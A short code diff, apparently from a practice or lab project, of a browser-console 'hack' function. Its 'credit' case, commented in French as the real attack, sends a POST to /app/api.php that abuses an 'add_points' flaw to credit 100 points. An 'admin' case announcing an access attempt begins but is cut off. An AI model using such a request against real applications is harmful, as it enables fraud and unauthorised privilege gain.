@@ -22,17 +22,17 @@ window.hack = function(command) {
         case 'credit':
             console.log("%c🎯 Exploitation de la faille 'add_points'...", "color: yellow;");
             
-            // LA VRAIE ATTAQUE
-            fetch('/app/api.php', {
-                method: 'POST', 
-                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-                body: 'action=add_points&points=100'
-            }).then(r => r.json())
-            
-            .catch(error => {
-                console.log("%c💥 Erreur lors de l'attaque", "color: red;");
-            });
-            break;
+                // LA VRAIE ATTAQUE
+                fetch('/app/api.php', {
+                    method: 'POST', 
+                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: 'action=add_points&points=100'
+                }).then(r => r.json())
+                
+                .catch(error => {
+                    console.log("%c💥 Erreur lors de l'attaque", "color: red;");
+                });
+                break;
 
         case 'admin':
             console.log("%c🎯 Tentative d'accès admin...", "color: yellow;");
